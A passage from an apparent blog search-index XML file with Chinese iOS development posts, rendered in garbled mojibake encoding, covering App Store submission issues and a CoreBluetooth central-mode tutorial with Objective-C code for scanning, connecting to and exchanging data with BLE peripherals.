enabled (Xcodesetting ENABLE_BITCODE), obtain an updated library from the vendor, or disablebitcode for this target. for architecture arm64 è§£å†³æ–¹æ³• é‡æ–°æ‰“åŒ…é™æ€åº“ï¼Œä½¿ä¹‹æ”¯æŒbitcode å¦‚æžœé™æ€åº“æ¯”è¾ƒè€ï¼Œæ²¡æ³•é‡æ–°ç¼–è¯‘ï¼Œå°±éœ€è¦å…³é—­xcodeçš„bitcodeåŠŸèƒ½ Target -&gt; Build Settings -&gt; Bulid option : Enable Bitcode è®¾ç½®ä¸ºNO é¡¹ç›®ä¸­æœ‰è®¾ç½®URL Schemes1error itms-90158: &quot;the following url schemes found in your app are not in the current format:[mqq://]. å¯èƒ½æ˜¯è·³è½¬çš„app id ä¸æ­£ç¡® appå®¡æ ¸é€šè¿‡åŽAppStoreä¾ç„¶æœç´¢ä¸åˆ°è§£å†³åŠžæ³• å¶å°”å®¡æ ¸é€šè¿‡ä½†æ˜¯æœç´¢ä¸åˆ°ï¼Œä¸€èˆ¬æ˜¯DNSç¼“å­˜é—®é¢˜ éœ€è¦ç­‰å¾…è‹¹æžœæœåŠ¡å™¨åˆ·æ–° å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•åŠ é€Ÿåˆ·æ–° åœ¨ä»·æ ¼ä¸Žé”€å”®èŒƒå›´é‡Œé¢ä¿®æ”¹ï¼šä»·æ ¼ â€”&gt; ç­‰çº§1ï¼ˆæ”¶è´¹å³å¯ï¼‰ã€é”€å”®åœ°åŒº å…¨éƒ¨å–æ¶ˆåªé€‰æ‹© -&gt; ä¸­å›½, ä¿å­˜ï¼Œæ­¤æ—¶åˆ·æ–°appå®¡æ ¸çŠ¶æ€å°±ä¼šå˜ä¸º pending contractï¼ˆåå•†ä»·æ ¼ï¼‰ ç„¶åŽå†åœ¨ä»·æ ¼ä¸Žé”€å”®èŒƒå›´é‡Œé¢ä¿®æ”¹ï¼šä»·æ ¼ â€”&gt; ç­‰çº§0ï¼ˆappåŽŸæ¥çš„ä»·æ ¼ æˆ‘è¿™é‡Œæ˜¯å…è´¹ï¼‰ã€é”€å”®åœ°åŒº å…¨éƒ¨é€‰æ‹© -&gt; æ‰€æœ‰åœ°åŒº, ä¿å­˜ï¼Œæ­¤æ—¶åˆ·æ–°appå®¡æ ¸çŠ¶æ€å°±ä¼šå˜ä¸º Ready for saleï¼ˆå¯ä¾›é”€å”®ï¼‰ ç­‰å¾…å¤§æ¦‚åŠä¸ªåˆ°ä¸€ä¸ªå°æ—¶å°±å¯ä»¥åœ¨AppStoreé‡Œé¢æœç´¢åˆ°äº† æ‰“åŒ…ä¸Šä¼ åŽå†iTunes connectåŽå°ä¸€ç›´çœ‹ä¸åˆ°ä¸Šä¼ çš„åŒ…æ–‡ä»¶ å¯èƒ½æ˜¯info.plisté‡Œé¢éœ€è¦é…ç½®çš„ç”³è¯·æƒé™æ²¡æœ‰é…ç½®ï¼Œè¿™æ—¶ä¼šæ”¶åˆ°APPleå‘é€çš„é‚®ä»¶è§£é‡Šçš„å¾ˆæ¸…æ¥šï¼Œä½†æ˜¯æœ‰æ—¶å¯èƒ½appleIDè´¦å·æ˜¯è€æ¿çš„ç§äººé‚®ç®±ï¼Œè€æ¿æ”¶åˆ°åˆæ²¡æœ‰åŠæ—¶è½¬å‘ç»™ä½ ï¼Œè¿™æ—¶å€™å°±è¦æ‰¾è€æ¿é—®ä¸‹æ˜¯å¦æœ‰æŽ¥æ”¶åˆ°é‚®ä»¶ã€‚ å…³äºŽæ¸¸å®¢è´¦æˆ· é™¤ç¤¾äº¤ã€å’Œè´¢äº§æŒ‚é’©ç­‰appå¯ä»¥åªæä¾›æ³¨å†ŒåŽç™»å½•ï¼Œå…¶ä»–appåº”è§†æƒ…å†µæä¾›æ¸¸å®¢ç™»å½•æ¨¡å¼ï¼Œåœ¨åº”ç”¨å†…é™åˆ¶æ¸¸å®¢è´¦æˆ·çš„åŠŸèƒ½ å¦‚æžœä¸æä¾›æ¸¸å®¢è´¦å·ç™»å½•åŠŸèƒ½ä¸€èˆ¬ä¸ä¼šå‡ºé—®é¢˜ï¼Œä½†æ˜¯ä¸»è¦çœ‹äººå“ï¼Œä¸èƒ½ç¡®å®šå“ªä¸€ç‰ˆæœ¬å°±ç»™æ‹’äº†App Store å®¡æ ¸æŒ‡å—ï¼ˆä¸­æ–‡ï¼‰ å…³äºŽå’Œç¡¬ä»¶ç›¸å…³çš„app æˆ‘ä»¬å…¬å¸å¤§éƒ¨åˆ†éƒ½æ˜¯å’Œå•ç‰‡æœºç­‰é€šè®¯çš„ç¡¬ä»¶äº§å“ï¼Œå…³äºŽè¿™ç±»appï¼Œä¸Šæž¶åŽéœ€è¦å½•åˆ¶è½¯ä»¶å’Œç¡¬ä»¶çš„æ“ä½œäº¤äº’è§†é¢‘ä¸Šä¼ YouTubeï¼ˆå»ºè®®ï¼‰æˆ–è€…youkuç­‰å¹³å°ï¼Œç„¶åŽåœ¨iTunes connect é‡Œé¢æä¾›ä¸Šä¼ è§†é¢‘è¿žæŽ¥ä»¥ä¾›å®¡æ ¸ã€‚]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Store</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSè“ç‰™å¼€å‘ä¹‹ä¸­å¿ƒè®¾å¤‡ç¯‡]]></title>
    <url>%2Farchives%2Fa46fbeec.html</url>
    <content type="text"><![CDATA[å½“æˆ‘è·¨è¿‡æ²‰æ²¦çš„ä¸€åˆ‡ï¼Œå‘ç€æ°¸æ’å¼€æˆ˜çš„æ—¶å€™ï¼Œä½ æ˜¯æˆ‘çš„å†›æ——ã€‚â€”â€” çŽ‹å°æ³¢ã€Šçˆ±ä½ å°±åƒçˆ±ç”Ÿå‘½ã€‹ å…³äºŽè“ç‰™4.0 è“ç‰™4.0æ˜¯ç”±è“ç‰™æŠ€æœ¯è”ç›Ÿåœ¨2012å¹´å‘å¸ƒçš„æœ€æ–°è“ç‰™ç‰ˆæœ¬ï¼Œè¾ƒ3.0ç‰ˆæœ¬æ›´çœç”µã€æˆæœ¬ä½Žã€å»¶è¿Ÿä½Žã€è¶…é•¿æœ‰æ•ˆè¿žæŽ¥è·ç¦»ã€AES-128åŠ å¯†ç­‰ã€‚è“ç‰™4.0è®¾å¤‡å› ä¸ºä½Žè€—ç”µï¼Œæ‰€ä»¥ä¹Ÿå«åšBLE ï¼ˆBluetooth Low Energyï¼‰ã€‚ æ”¯æŒä¸¤ç§éƒ¨ç½²æ–¹å¼ï¼šåŒæ¨¡å¼å’Œå•æ¨¡å¼ã€‚ åŒæ¨¡å¼åŒ…å«ä¼ ç»Ÿè“ç‰™éƒ¨åˆ†ï¼ˆClasssic Bluetoothï¼‰å’Œä½ŽåŠŸè€—è“ç‰™éƒ¨åˆ†ï¼ˆBluetooth Low Energy å³BLE)ã€‚ åœ¨BLE4.0ä¹‹å‰ï¼Œè¿žæŽ¥çš„è“ç‰™è®¾å¤‡æ˜¯éœ€è¦ç»è¿‡MFIè®¤è¯çš„ MFI â€“ Make For ipad ,iphone, itouch ç­‰ä¸“ä»¬ä¸ºè‹¹æžœè®¾å¤‡åˆ¶ä½œçš„è®¾å¤‡ Appleè®¾å¤‡å¯¹BLE4.0æ”¯æŒ iPhone4SåŠä»¥åŽçš„è®¾å¤‡ ç¬¬ä¸‰ä»£iPadåŠä»¥åŽçš„è®¾å¤‡ iMacã€MacBookAirã€MacBook Proç­‰ ç³»ç»Ÿæ˜¯ä»ŽiOS6å¼€å§‹æ”¯æŒBLE4.0 CoreBluetoothæ¡†æž¶ CoreBluetoothæ˜¯AppleåŸºäºŽè“ç‰™4.0æ ‡å‡†å°è£…çš„ä¸€å¥—è“ç‰™å¼€å‘æ¡†æž¶ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨CoreBluetoothå¼€å‘çš„æ—¶å€™ï¼Œå¯¹åº”çš„è“ç‰™è®¾å¤‡å¿…é¡»ä¹Ÿéµå¾ªè“ç‰™4.0ã€‚ CoreBluetoothå¼€å‘åˆ†ä¸¤ç§æ¨¡å¼ ä¸­å¿ƒæ¨¡å¼ï¼ˆCentralï¼‰: æŽ¥æ”¶å‘¨è¾¹è“ç‰™å‘æ¥çš„å¹¿æ’­æ•°æ®ã€‚ å¤–è®¾æ¨¡å¼ï¼ˆPeripheralï¼‰: è‡ªå·±ä½œä¸ºè“ç‰™è®¾å¤‡ï¼Œå¯¹å¤–å¹¿æ’­æ•°æ®ã€‚ ä¸€ä¸ªå¤–éƒ¨è®¾å¤‡åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡ï¼Œä¸€ä¸ªæœåŠ¡åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªç‰¹å¾ã€‚ ä¸­å¿ƒæ¨¡å¼çš„å¼€å‘æµç¨‹ å»ºç«‹ä¸­å¿ƒç®¡ç†è€… æ‰«æå¤–è®¾ è¿žæŽ¥å¤–è®¾ æ‰«æå¤–è®¾ä¸­çš„æœåŠ¡å’Œç‰¹å¾ èŽ·å–å¤–è®¾çš„services èŽ·å–å¤–è®¾çš„Characteristics,èŽ·å–Characteristicsçš„å€¼ï¼ŒèŽ·å–Characteristicsçš„Descriptorå’ŒDescriptorçš„å€¼ è®¢é˜…Characteristic ä¸Žå¤–è®¾åšæ•°æ®äº¤äº’(explore and interact) æ–­å¼€è¿žæŽ¥(disconnect) åˆå§‹åŒ– ä½¿ç”¨è“ç‰™éœ€è¦åœ¨inof.plistæ–‡ä»¶é…ç½®Privacy - Bluetooth Peripheral Usage Description KEYå‘ç”¨æˆ·è¯·æ±‚è“ç‰™æƒé™ å¯¼å…¥è“ç‰™å¼€å‘æ¡†æž¶éµå®ˆä¸¤ä¸ªåè®® åˆå§‹åŒ–ä¸€ä¸ªä¸­å¿ƒè®¾å¤‡ç®¡ç†è€…å¹¶è®¾ç½®ä»£ç† 12345678910#import &lt;CoreBluetooth/CoreBluetooth.h&gt;@interface XSBleManager () &lt;CBCentralManagerDelegate, CBPeripheralDelegate&gt;/** ä¸­å¿ƒè®¾å¤‡ç®¡ç†è€… */@property (nonatomic, strong) CBCentralManager *centralManager;@end// åˆå§‹åŒ–å¹¶è®¾ç½®ä»£ç†_centralManager = [[CBCentralManager alloc] initWithDelegate:self queue:nil]; ç›‘å¬è“ç‰™çŠ¶æ€æ”¹å˜ åˆå§‹åŒ–è“ç‰™ä¸­å¿ƒè®¾å¤‡ç®¡ç†è€…ä¹‹åŽï¼Œä¼šæ£€æµ‹å¹¶è¿”å›žå½“å‰ç³»ç»Ÿè“ç‰™çŠ¶æ€ å½“è“ç‰™å¤„äºŽæ‰“å¼€å¯ç”¨çŠ¶æ€ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è“ç‰™å‘èµ·æ‰«æå‘¨è¾¹çš„å¤–è®¾äº† 1234567891011- (void)centralManagerDidUpdateState:(CBCentralManager *)central;// central.state å³æ˜¯å½“å‰çš„è“ç‰™çŠ¶æ€typedef NS_ENUM(NSInteger, CBManagerState) &#123; CBManagerStateUnknown = 0, CBManagerStateResetting, // é‡ç½®ä¸­ CBManagerStateUnsupported, // ä¸æ”¯æŒ CBManagerStateUnauthorized, // æœªæŽˆæƒ CBManagerStatePoweredOff, // å…³é—­ CBManagerStatePoweredOn, // æ‰“å¼€&#125; NS_ENUM_AVAILABLE(10_13, 10_0); æ‰«æå¤–è®¾ æ‰«æè®¾åˆ«å¯ä»¥æ‰«æå‘¨è¾¹æ‰€æœ‰çš„è®¾å¤‡ä¹Ÿå¯ä»¥æ ¹æ®æœåŠ¡UUIDè¿‡æ»¤æŽ‰ä¸ç¬¦åˆçš„è®¾å¤‡ï¼Œå¯æ ¹æ®éœ€æ±‚é€‰æ‹© åªåœ¨å¿…è¦çš„æ—¶å€™è®¾ç½® CBCentralManagerScanOptionAllowDuplicatesKey peripheral æ¯ç§’éƒ½åœ¨å‘é€å¤§é‡çš„æ•°æ®åŒ…ï¼ŒscanForPeripheralsWithServices:options:æ–¹æ³•ä¼šå°†åŒä¸€ peripheral å‘å‡ºçš„å¤šä¸ªæ•°æ®åŒ…åˆå¹¶ä¸ºä¸€ä¸ªäº‹ä»¶ï¼Œç„¶åŽæ¯æ‰¾åˆ°ä¸€ä¸ª peripheral éƒ½ä¼šè°ƒç”¨ centralManager:didDiscoverPeripheral:advertisementData:RSSI:æ–¹æ³•ã€‚å¦å¤–ï¼Œå½“å·²å‘çŽ°çš„ peripheral å‘é€çš„æ•°æ®åŒ…æœ‰å˜åŒ–æ—¶ï¼Œè¿™ä¸ªä»£ç†æ–¹æ³•åŒæ ·ä¼šè°ƒç”¨ã€‚ ä»¥ä¸Šåˆå¹¶äº‹ä»¶çš„æ“ä½œæ˜¯ scanForPeripheralsWithServices:options:çš„é»˜è®¤è¡Œä¸ºï¼Œå³æœªè®¾ç½® optionå‚æ•°ã€‚å¦‚æžœä¸æƒ³è¦é»˜è®¤è¡Œä¸ºï¼Œå¯å°† optionè®¾ç½®ä¸º CBCentralManagerScanOptionAllowDuplicatesKeyã€‚è®¾ç½®ä»¥åŽï¼Œæ¯æ”¶åˆ°å¹¿æ’­ï¼Œå°±ä¼šè°ƒç”¨ä¸Šé¢çš„å›žè°ƒï¼ˆæ— è®ºå¹¿æ’­æ•°æ®æ˜¯å¦ä¸€æ ·ï¼‰ã€‚å…³é—­é»˜è®¤è¡Œä¸ºä¸€èˆ¬ç”¨äºŽä»¥ä¸‹åœºæ™¯ï¼šæ ¹æ® peripheral çš„è·ç¦»æ¥åˆå§‹åŒ–è¿žæŽ¥ï¼ˆè·ç¦»å¯ç”¨ä¿¡å·å¼ºåº¦ RSSI æ¥åˆ¤æ–­ï¼‰ã€‚è®¾ç½®è¿™ä¸ª optionä¼šå¯¹ç”µæ± å¯¿å‘½å’Œ app çš„æ€§èƒ½äº§ç”Ÿä¸åˆ©å½±å“ï¼Œæ‰€ä»¥ä¸€å®šè¦åœ¨å¿…è¦çš„æ—¶å€™ï¼Œå†å¯¹å…¶è¿›è¡Œè®¾ç½®ã€‚ 1234// æ–¹å¼1 ï¼šæ‰«ææ‰€æœ‰è®¾å¤‡ [_centralManager scanForPeripheralsWithServices:nil options:nil];// æ–¹å¼2 ï¼šæ‰«æç‰¹å®šçš„æœåŠ¡çš„è®¾å¤‡ æœåŠ¡UUIDå¯ä»¥æŸ¥è¯¢å…¬å¸æ–‡æ¡£æˆ–è€…å’Œç¡¬ä»¶å·¥ç¨‹å¸ˆæ²Ÿé€š[_centralManager scanForPeripheralsWithServices:@[[CBUUID UUIDWithString:ServiceUUIDString1], [CBUUID UUIDWithString:ServiceUUIDString2]] options:@&#123; CBCentralManagerScanOptionAllowDuplicatesKey:@YES &#125;]; æ‰«ææˆåŠŸåŽå°±ä¼šè°ƒç”¨å¦‚ä¸‹æ–¹æ³•å°†å¤–è®¾çš„åç§°ã€æ ‡è¯†ã€ä¿¡å·å¼ºåº¦ã€çŠ¶æ€ç­‰ä¿¡æ¯è¿”å›ž å¯ä»¥åœ¨æ­¤æ–¹æ³•ç­›é€‰å’Œè¿‡æ»¤æ‰«æåˆ°çš„è®¾å¤‡ï¼Œå¦‚æ ¹æ®å…¬å¸å¤–è®¾çš„å‘½åè§„å®šå’Œæœç´¢åˆ°çš„è®¾å¤‡åç§°å¯¹æ¯”ï¼Œè¿‡æ»¤æŽ‰ä¸€äº›ä¸ç¬¦åˆçš„è®¾å¤‡ æ³¨æ„ç‚¹ï¼š å¦‚æžœéœ€è¦èŽ·å–è“ç‰™çš„åç§°ï¼ŒæŽ¨èä»ŽadvertisementDataä¸­èŽ·å–ï¼Œè€Œä¸è¦ç›´æŽ¥èŽ·å–aPeripheralä¸­çš„ï¼Œå› ä¸ºæœ‰æ—¶å€™è“ç‰™è®¾å¤‡ä¿®æ”¹åç§° peripheral.name ä¸ä¼šç«‹å³åˆ·æ–°ï¼Œè€ŒadvertisementDataä¼šå®žæ—¶åˆ·æ–° iOSæ¡†æž¶æ˜¯ä¸èƒ½é€šè¿‡Macåœ°å€ç›´æŽ¥è¿žæŽ¥è“ç‰™çš„è€Œä¸”Appleå…¬å¸ä¹Ÿå±è”½äº†è®¾å¤‡çš„Macåœ°å€ï¼Œå–ä»£è¿”å›žçš„æ˜¯ä¸€ä¸ªæ ¹æ®æŸäº›å‚æ•°ç”Ÿæˆçš„UUID,è¿™ä¸€ç‚¹å’Œå®‰å“ä¸åŒï¼Œå¹¶ä¸”iOSè“ç‰™è¿žæŽ¥å¤–è®¾èŽ·å–çš„çš„å”¯ä¸€æ ‡è¯†å¹¶ä¸æ˜¯ç»å¯¹å”¯ä¸€çš„: é‡å¯æ‰‹æœºå°±å¯èƒ½å¯¼è‡´è®¾å¤‡çš„å”¯ä¸€æ ‡è¯†å‘ç”Ÿå˜åŒ–ï¼Œè€Œä¸”ä¸åŒæ‰‹æœºè¿žæŽ¥åŒä¸€ä¸ªè®¾å¤‡èŽ·å–åˆ°çš„è“ç‰™è®¾å¤‡æ ‡è¯†ä¹Ÿæ˜¯ä¸åŒçš„ å¦‚æžœå¯¹è¿žæŽ¥çš„è®¾å¤‡çš„å”¯ä¸€æ ‡è¯†æœ‰ç‰¹åˆ«çš„éœ€æ±‚ï¼Œå¯ä»¥é€šè¿‡å’Œç¡¬ä»¶å·¥ç¨‹å¸ˆæ²Ÿé€šå°†Macåœ°å€æ”¾å…¥advertisementDataä¸­æ¥å®žçŽ°èŽ·å–è®¾å¤‡çš„Macåœ°å€ 1234567- (void)centralManager:(CBCentralManager *)central didDiscoverPeripheral:(CBPeripheral *)aPeripheral advertisementData:(NSDictionary *)advertisementData RSSI:(NSNumber *)RSSI&#123; if ([peripheral.namehasPrefix:@"XXX"] ) &#123; // åœæ­¢æ‰«æ // è¿žæŽ¥è®¾å¤‡ &#125;&#125; è¿žæŽ¥å¤–è®¾ æ‰«æåˆ°å¤–è®¾ï¼Œå°±å¯ä»¥å‘èµ·è¿žæŽ¥äº† æ³¨æ„ï¼šè¿žæŽ¥å¤–è®¾å‰ï¼Œéœ€è¦å…³é—­æ‰«æä»¥çœç”µå¹¶å‡å°‘ä½ç½®é”™è¯¯å‘ç”Ÿ 12[_centralManager stopScan];// åœæ­¢æ‰«æ[manager connectPeripheral:peripheral options:nil]; // è¿žæŽ¥è®¾å¤‡ è¿žæŽ¥å¤–è®¾æˆåŠŸè°ƒç”¨æ–¹æ³•ï¼Œåœ¨æ­¤æ–¹æ³•å¯ä»¥å¼€å§‹æ‰«ææœåŠ¡ä¿¡æ¯ æ³¨æ„ï¼šä¸€å®šè¦è®¾ç½®ä»£ç†ï¼Œä¸ç„¶æ‰«æåˆ°æœåŠ¡ä¿¡æ¯ä¹Ÿä¸ä¼šæœ‰ä»£ç†å›žè°ƒ 123456- (void)centralManager:(CBCentralManager *)central didConnectPeripheral:(CBPeripheral *)peripheral&#123; XSLogFunc [peripheral setDelegate:self]; // è®¾ç½®ä»£ç† [peripheral discoverServices:nil]; // å¼€å§‹æ‰«ææœåŠ¡&#125; è¿žæŽ¥å¤–è®¾å¤±è´¥è°ƒç”¨æ–¹æ³•ï¼Œæ­¤æ—¶éœ€è¦æ¸…ç©ºä»£ç† 12345678- (void)centralManager:(CBCentralManager *)central didFailToConnectPeripheral:(CBPeripheral *)peripheral error:(NSError *)error&#123; XSLogFunc if (peripheral) &#123; peripheral.delegate = nil; peripheral = nil; &#125;&#125; æ‰«æåˆ°å¤–è®¾ æ‰«æåˆ°å¤–è®¾æœåŠ¡æ—¶å¦‚æžœä¼ å…¥nil, åˆ™ä»£è¡¨æ‰«ææ‰€æœ‰çš„å¤–è®¾æœåŠ¡ ä½†å®žé™…ä¸Šï¼Œä½ å¯èƒ½åªéœ€è¦å…¶ä¸­çš„æŸå‡ ä¸ªã€‚æœç´¢å…¨éƒ¨çš„æ“ä½œæ—¢è€—æ—¶åˆè€—ç”µï¼Œæ‰€ä»¥åº”è¯¥æä¾›ä¸€ä¸ªè¦æœç´¢çš„ service çš„ UUID æ•°ç»„ 123[peripheral discoverServices:nil]; // å‡è®¾ä½ åªéœ€è¦ç”¨åˆ° peripheral æä¾›çš„ä¼—å¤š service çš„ä¸¤ä¸ªï¼Œé‚£ä¹ˆåœ¨æœç´¢ service çš„æ—¶å€™å¯ä»¥è®¾ç½®è¦æœç´¢çš„ service çš„ UUID// [peripheral discoverServices:@[firstServiceUUID, secondServiceUUID]]; æ‰«æåˆ°å¤–è®¾æœåŠ¡çš„å›žè°ƒ æ‰«ææ‰«æœåŠ¡ä¿¡æ¯åŽï¼Œæ—¢å¯ä»¥åŽ»æ‰«ææœåŠ¡é‡Œé¢çš„ç‰¹å¾ 1234567- (void)peripheral:(CBPeripheral *)peripheral didDiscoverServices:(NSError *)error&#123; XSLogFunc for (CBService *aService in peripheral.services) &#123; [peripheral discoverCharacteristics:nil forService:aService]; // æ‰«ææœåŠ¡ä¸­çš„ç‰¹å¾ &#125;&#125; æ‰«æç‰¹å¾ èŽ·å–åˆ°å¯¹åº”çš„éœ€è¦çš„ç‰¹å¾ï¼Œæˆ‘ä»¬æ—¢å¯ä»¥å¯¹ç‰¹å¾è¿›è¡Œè®¢é˜…æˆ–è€…å’Œè®¾åˆ«è¿›è¡Œæ•°æ®äº¤äº’ä»¥åŠå‡çº§è®¾å¤‡è“ç‰™ä¿¡æ¯ç­‰ç­‰æ“ä½œ æŽ¥æ”¶ characteristic æ•°æ®çš„æ–¹å¼æœ‰ä¸¤ç§ï¼š åœ¨éœ€è¦æŽ¥æ”¶æ•°æ®çš„æ—¶å€™ï¼Œè°ƒç”¨ readValueForCharacteristic:ï¼Œè¿™ç§æ˜¯éœ€è¦ä¸»åŠ¨åŽ»æŽ¥æ”¶çš„ã€‚ ç”¨ setNotifyValue:forCharacteristic:æ–¹æ³•è®¢é˜…ï¼Œå½“æœ‰æ•°æ®å‘é€æ—¶ï¼Œå¯ä»¥ç›´æŽ¥åœ¨å›žè°ƒä¸­æŽ¥æ”¶ã€‚ 1234567891011121314151617181920212223242526272829- (void)peripheral:(CBPeripheral *)peripheral didDiscoverCharacteristicsForService:(CBService *)service error:(NSError *)error&#123; XSLogFunc if (error) &#123; XSLog(@"æœç´¢Characteristicå¤±è´¥:%@", peripheral.services); return; &#125; for (CBCharacteristic *characteristic in service.characteristics) &#123; XSLog(@"æœç´¢åˆ°çš„æœåŠ¡ï¼š%@ å¯¹åº”çš„æ‰€æœ‰ï¼šCharacteristic:%@", service, characteristic); // å…·ä½“çš„ç‰¹å¾å€¼çš„ä½œç”¨è¯·å‚è€ƒå…¬å¸æ–‡æ¡£æˆ–è€…å’Œå…¬å¸ç¡¬ä»¶å·¥ç¨‹å¸ˆæ²Ÿé€š // å¯è®¢é˜…çš„ç‰¹å¾// if ([characteristic.UUID.UUIDString isEqualToString:CharacteristicNotifyUUIDString]) &#123;// [peripheral setNotifyValue:YES forCharacteristic:characteristic];//// &#125; // OTAå‡çº§ç‰¹å¾// if ([characteristic.UUID.UUIDString isEqual:CharacteristicWriteOTAUUIDString]) &#123;//// &#125; // å¯å†™çš„ç‰¹å¾// if ([characteristic.UUID.UUIDString isEqual:CharacteristicWriteUUIDString]) &#123;//// &#125; &#125;&#125; ç‰¹å¾å€¼ç±»åž‹ 123456789101112typedef NS_OPTIONS(NSUInteger, CBCharacteristicProperties) &#123; CBCharacteristicPropertyBroadcast = 0x01, CBCharacteristicPropertyRead = 0x02, CBCharacteristicPropertyWriteWithoutResponse = 0x04, CBCharacteristicPropertyWrite = 0x08, CBCharacteristicPropertyNotify = 0x10, CBCharacteristicPropertyIndicate = 0x20, CBCharacteristicPropertyAuthenticatedSignedWrites = 0x40, CBCharacteristicPropertyExtendedProperties = 0x80, CBCharacteristicPropertyNotifyEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0) = 0x100, CBCharacteristicPropertyIndicateEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0) = 0x200&#125;; è¯»å–ç‰¹å¾çš„æ•°æ® characteristic åŒ…å«äº† service è¦ä¼ è¾“çš„æ•°æ®ã€‚ä¾‹å¦‚æ¸©åº¦è®¾å¤‡ä¸­è¡¨è¾¾æ¸©åº¦çš„ characteristicï¼Œå°±å¯èƒ½åŒ…å«ç€å½“å‰æ¸©åº¦å€¼ã€‚è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¯»å– characteristicï¼Œæ¥å¾—åˆ°é‡Œé¢çš„æ•°æ®ã€‚ å½“æ‰¾åˆ° characteristic ä¹‹åŽï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨CBPeripheralçš„readValueForCharacteristic:æ–¹æ³•æ¥è¿›è¡Œè¯»å–ã€‚ å½“ä½ è°ƒç”¨ä¸Šé¢è¿™æ–¹æ³•åŽï¼Œä¼šå›žè°ƒperipheral:didUpdateValueForCharacteristic:error:æ–¹æ³•ï¼Œå…¶ä¸­åŒ…å«äº†è¦è¯»å–çš„æ•°æ®ã€‚å¦‚æžœè¯»å–æ­£ç¡®ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼æ¥èŽ·å¾—å€¼ï¼š 1234- (void)peripheral:(CBPeripheral *)peripheral didUpdateValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; NSData *data = characteristic.value; // parse the data as needed&#125; æ³¨æ„ï¼Œä¸æ˜¯æ‰€æœ‰ characteristic çš„å€¼éƒ½æ˜¯å¯è¯»çš„ï¼Œä½ å¯ä»¥é€šè¿‡CBCharacteristicPropertyReadoptions æ¥è¿›è¡Œåˆ¤æ–­ï¼ˆè¿™ä¸ªæžšä¸¾ä¼šåœ¨ä¸‹ä¸€ç« ä¸­ä»‹ç»åˆ°ï¼‰ã€‚å¦‚æžœä½ å°è¯•è¯»å–ä¸å¯è¯»çš„æ•°æ®ï¼Œé‚£ä¸Šé¢çš„ä»£ç†æ–¹æ³•ä¼šè¿”å›žç›¸åº”çš„ errorã€‚ è®¢é˜… Characteristic æ•°æ® å…¶å®žä½¿ç”¨readValueForCharacteristic:æ–¹æ³•å¹¶ä¸æ˜¯å®žæ—¶çš„ã€‚è€ƒè™‘åˆ°å¾ˆå¤šå®žæ—¶çš„æ•°æ®ï¼Œæ¯”å¦‚å¿ƒçŽ‡è¿™ç§ï¼Œé‚£å°±éœ€è¦è®¢é˜… characteristic äº†ã€‚ å¯ä»¥é€šè¿‡è°ƒç”¨CBPeripheralçš„setNotifyValue:forCharacteristic:æ–¹æ³•æ¥å®žçŽ°è®¢é˜…ï¼Œæ³¨æ„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯YESã€‚ 1[peripheral setNotifyValue:YES forCharacteristic:interestingCharacteristic]; å¦‚æžœæ˜¯è®¢é˜…ï¼ŒæˆåŠŸä¸Žå¦çš„å›žè°ƒæ˜¯peripheral:didUpdateNotificationStateForCharacteristic:error:ï¼Œè¯»å–ä¸­çš„é”™è¯¯ä¼šä»¥ error å½¢å¼ä¼ å›žï¼š å½“ç„¶ä¹Ÿä¸æ˜¯æ‰€æœ‰ characteristic éƒ½å…è®¸è®¢é˜…ï¼Œä¾ç„¶å¯ä»¥é€šè¿‡CBCharacteristicPropertyNoifyoptions æ¥è¿›è¡Œåˆ¤æ–­ 123456- (void)peripheral:(CBPeripheral *)peripheral didUpdateNotificationStateForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; if (error) &#123; XSLog(@"Error changing notification state: %@", [error localizedDescription]); &#125;&#125; æ•°æ®å†™å…¥ç‰¹å¾ å†™æ•°æ®å…¶å®žæ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„éœ€æ±‚ï¼Œå¦‚æžœ characteristic å¯å†™ï¼Œä½ å¯ä»¥é€šè¿‡CBPeripheralç±»çš„writeValue:forCharacteristic:type:æ–¹æ³•æ¥å‘è®¾å¤‡å†™å…¥NSDataæ•°æ®ã€‚ CBCharacteristicWriteWithResponse æŒ‡å®šå†™å…¥æˆåŠŸåŽå›žè°ƒä»£ç†æ–¹æ³• CBCharacteristicWriteWithoutResponse æŒ‡å®šå†™å…¥æˆåŠŸåŽä¸éœ€è¦å›žè°ƒä»£ç†æ–¹æ³• 1[_connectedPeripheral writeValue:data forCharacteristic:toCharacteristic type:CBCharacteristicWriteWithResponse]; å¦‚æžœå†™å…¥æˆåŠŸåŽè¦å›žè°ƒï¼Œé‚£ä¹ˆå›žè°ƒæ–¹æ³•æ˜¯peripheral:didWriteValueForCharacteristic:error:ã€‚å¦‚æžœå†™å…¥å¤±è´¥ï¼Œé‚£ä¹ˆä¼šåŒ…å«åˆ° error å‚æ•°è¿”å›žã€‚ æ³¨æ„ï¼šcharacteristic ä¹Ÿå¯èƒ½å¹¶ä¸æ”¯æŒå†™æ“ä½œï¼Œå¯ä»¥é€šè¿‡CBCharacteristicçš„propertieså±žæ€§æ¥åˆ¤æ–­ã€‚ 1- (void)peripheral:(CBPeripheral *)peripheral didWriteValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error; å…³äºŽæ•°æ®åˆ†åŒ…åŠæ•°æ®æ ¡éªŒçš„ä¸€äº›æ‰©å±• è“ç‰™4.0å› ä¸ºæ˜¯ä½ŽåŠŸè€—çš„ï¼Œæ‰€ä»¥æ•°æ®å‘é€çš„æ•ˆçŽ‡å°±æ²¡æœ‰ä¹‹å‰ç‰ˆæœ¬è“ç‰™çš„æ”¶å‘æ•ˆçŽ‡é«˜ï¼Œæ¯æ¬¡æŽ¥æ”¶å’Œå‘é€æ•°æ®ä¸èƒ½è¶…è¿‡20ä¸ªå­—èŠ‚ 